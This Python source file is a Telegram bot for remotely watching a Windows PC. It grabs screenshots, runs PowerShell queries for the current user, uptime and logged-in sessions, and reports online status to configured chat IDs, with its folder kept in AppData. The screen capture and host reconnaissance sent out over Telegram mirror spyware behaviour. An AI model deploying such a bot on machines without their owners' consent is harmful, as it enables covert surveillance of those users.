#!/usr/bin/env python
# pylint: disable=C0116
# This program is dedicated to the public domain under the CC0 license.

"""
Simple Bot to reply to Telegram messages.

First, a few handler functions are defined. Then, those functions are passed to
the Dispatcher and registered at their respective places.
Then, the bot is started and runs until we press Ctrl-C on the command line.

Usage:
Basic Echobot example, repeats messages.
Press Ctrl-C on the command line or send a signal to the process to stop the
bot.
"""

import logging

from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext
from api_keys import token, chat_ids
from subprocess import Popen, PIPE
import os
from PIL import ImageGrab
# import platform

# Enable logging
# logging.basicConfig(
#     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
# )

logger = logging.getLogger(__name__)
appdata_roaming_folder = os.environ['APPDATA']
app_name = "remote_bot"
app_folder = f'{appdata_roaming_folder}\\{app_name}'
if not os.path.exists(app_folder):
    os.makedirs(app_folder)
    app_name_exe = f"app_folder\\{app_folder}.exe"

def ps_command(command, cmd_app='powershell'):
    """
    Function to interract with powershell.
    ps_encode sets encoding of the shell input-output to utf-8
    """
    ps_encode = "[System.Console]::OutputEncoding = [System.Console]::InputEncoding = [System.Text.Encoding]::UTF8;"
    command = cmd_app, f"{ps_encode}{command}"
    with open(os.devnull, 'w') as DEVNULL:
        resp = Popen(command,
                     stdout=PIPE,
                     stderr=DEVNULL,
                     stdin=DEVNULL,
                     close_fds=False,
                     shell=True)
    return resp.communicate()[0].decode().split('\n')


def get_screen(update: Update, context: CallbackContext) -> None:
    # could be a problem if screen resolution > 1920px
    screenshot = ImageGrab.grab()
    jpg_location = f"{app_folder}\\scr.jpg"
    screenshot.save(jpg_location)
    context.bot.send_photo(chat_id=update.effective_chat.id,
                           photo=open(jpg_location, 'rb'))
    os.remove(jpg_location)


def startup(update: Update) -> None:
    """Send a message when the bot is started
    to the users listed in the user_ids."""
    query = 'whoami'
    response = ps_command(query)[0].split('\n')[0]
    response = f"{response} -> Online"
    for user in chat_ids:
        update.bot.sendMessage(text=response, chat_id=user)



def uptime(update: Update, context: CallbackContext) -> None:
    # return time.time() - psutil.boot_time()
    # code below is an example of how to pass multiline commands to ps
    bootuptime = "$bootuptime = (Get-CimInstance -ClassName Win32_OperatingSystem).LastBootUpTime;"
    curr_date = "$CurrDate = Get-Date;"
    detailed_uptime = "$uptime = $CurrDate - $bootuptime;"
    # uptime = "$uptime" # return full response
    uptime = "$($uptime.days),$($uptime.Hours),$($uptime.Minutes)" # list of vars ['0\r', '1\r', '29\r', '']
    response = ps_command(f"{bootuptime}{curr_date}{detailed_uptime}{uptime}")
    print(response)
    update.message.reply_text(response)


def pwd(update: Update, context: CallbackContext) -> None:
    response = os.getcwd()
    update.message.reply_text(response)


def get_execution_policy(update: Update, context: CallbackContext) -> None:
    query = "Get-ExecutionPolicy -List"
    response = '\n'.join(ps_command(query))
    update.message.reply_text(response)


def users(update: Update, context: CallbackContext) -> None:
    query = f"query user /server:$SERVER"
    response = ps_command(query)
    # means there are only one active user
    if len(response) < 4:
        response = response[1].split()
        response = f"ID:{response[2]}\nUser: {response[0]}\nSession: {response[1]}\nState: {response[3]}\nLogon: {response[5]} {response[6]}"
    update.message.reply_text(response)


# def echo(update: Update, context: CallbackContext) -> None:
#     """Echo the user message."""
#     update.message.reply_text(update.message.text)


def main() -> None:
    """Start the bot."""
    updater = Updater(token)
    startup(updater)

    # Get the dispatcher to register handlers
    dispatcher = updater.dispatcher
    # dispatcher.add_handler(CommandHandler("start", start, Filters.user(username="@tg_username")))
    dispatcher.add_handler(CommandHandler("users", users, Filters.chat(chat_id=chat_ids)))
    dispatcher.add_handler(CommandHandler("pwd", pwd, Filters.chat(chat_id=chat_ids)))
    dispatcher.add_handler(CommandHandler("gep", get_execution_policy, Filters.chat(chat_id=chat_ids)))
    dispatcher.add_handler(CommandHandler("uptime", uptime, Filters.chat(chat_id=chat_ids)))
    dispatcher.add_handler(CommandHandler("get_screen", get_screen, Filters.chat(chat_id=chat_ids)))

    # on noncommand i.e message - echo the message on Telegram
    # dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, echo))
    updater.start_polling()
    updater.idle()


if __name__ == '__main__':
    main()